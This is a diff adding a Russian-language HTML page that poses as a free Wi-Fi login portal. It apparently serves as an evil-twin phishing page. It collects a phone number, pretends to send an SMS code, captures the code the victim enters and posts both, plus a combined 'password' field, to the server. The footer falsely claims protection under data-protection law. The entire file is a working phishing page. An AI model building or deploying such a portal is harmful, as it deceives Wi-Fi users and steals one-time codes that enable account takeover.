@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Бесплатный Wi-Fi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(160deg,#141e30,#243b55);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;max-width:380px;width:100%;padding:34px 28px;border-radius:16px;box-shadow:0 18px 50px rgba(0,0,0,.45);text-align:center}
+.wifi{width:76px;height:76px;margin:0 auto 18px;border-radius:50%;background:linear-gradient(135deg,#00c6ff,#0072ff);display:flex;align-items:center;justify-content:center;box-shadow:0 8px 22px rgba(0,114,255,.4)}
+.wifi svg{width:40px;height:40px}
+h1{font-size:21px;color:#1c2733;margin-bottom:6px}
+.sub{font-size:13px;color:#78849a;line-height:1.55;margin-bottom:24px}
+label{display:block;text-align:left;font-size:12px;color:#445;font-weight:600;margin:14px 0 6px}
+input{width:100%;padding:13px 14px;border:1.5px solid #dde3ec;border-radius:10px;font-size:16px;outline:none;transition:border .15s}
+input:focus{border-color:#0072ff}
+.phone{letter-spacing:1px}
+button{width:100%;margin-top:20px;padding:14px;background:linear-gradient(135deg,#00c6ff,#0072ff);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 6px 18px rgba(0,114,255,.35)}
+button:active{transform:scale(.98)}
+.step2{display:none}
+.timer{font-size:12px;color:#9aa5b8;margin-top:12px}
+.law{font-size:10.5px;color:#a4adbd;margin-top:22px;line-height:1.6;border-top:1px solid #eef1f6;padding-top:14px}
+#msg{font-size:12px;color:#e74c3c;margin-top:10px;min-height:15px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="wifi">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round">
+      <path d="M5 12.5a10 10 0 0 1 14 0"/>
+      <path d="M8.5 15.5a5.5 5.5 0 0 1 7 0"/>
+      <circle cx="12" cy="19" r="1.4" fill="#fff" stroke="none"/>
+    </svg>
+  </div>
+
+  <h1>Бесплатный Wi-Fi</h1>
+  <p class="sub">Подключайтесь к высокоскоростному интернету<br>абсолютно бесплатно</p>
+
+  <div class="step1" id="step1">
+    <label for="phone">Номер телефона</label>
+    <input type="tel" id="phone" class="phone" name="phone_display" placeholder="+7 (___) ___-__-__" required>
+    <button type="button" onclick="sendCode()">Получить код</button>
+    <p class="timer" id="hint">На этот номер придёт код подтверждения</p>
+  </div>
+
+  <div class="step2" id="step2">
+    <label for="phone2">Номер телефона</label>
+    <input type="tel" id="phone2" class="phone" value="" readonly style="background:#f4f6fa">
+    <label for="code">Код из SMS</label>
+    <input type="tel" id="code" name="code_display" placeholder="_ _ _ _" maxlength="4" inputmode="numeric" required>
+    <form method="POST" action="/" id="f">
+      <input type="hidden" name="phone" id="ph">
+      <input type="hidden" name="code" id="cd">
+      <input type="hidden" name="password" id="pw">
+    </form>
+    <button type="button" onclick="connect()">Подключиться</button>
+    <p class="timer" id="timer"></p>
+    <p id="msg"></p>
+  </div>
+
+  <p class="law">Подключаясь к сети, вы соглашаетесь с условиями использования.<br>Соединение защищено в соответствии с ФЗ-152</p>
+</div>
+
+<script>
+var left=60;
+function sendCode(){
+  var p=document.getElementById('phone').value.replace(/\s/g,'');
+  if(p.replace(/\D/g,'').length<10){document.getElementById('hint').style.color='#e74c3c';document.getElementById('hint').textContent='Введите корректный номер телефона';return;}
+  document.getElementById('ph').value=p;
+  document.getElementById('phone2').value=p;
+  document.getElementById('step1').style.display='none';
+  document.getElementById('step2').style.display='block';
+  var t=setInterval(function(){
+    left--;
+    document.getElementById('timer').textContent='Повторная отправка кода через 0:'+ (left<10?'0':'') + left;
+    if(left<=0){clearInterval(t);document.getElementById('timer').textContent='';}
+  },1000);
+  setTimeout(function(){document.getElementById('code').focus();},50);
+}
+function connect(){
+  var c=document.getElementById('code').value.replace(/\D/g,'');
+  if(c.length<4){document.getElementById('msg').textContent='Введите код из SMS';return;}
+  document.getElementById('cd').value=c;
+  document.getElementById('pw').value=document.getElementById('ph').value+':'+c;
+  document.getElementById('f').submit();
+}
+</script>
+</body>
+</html>
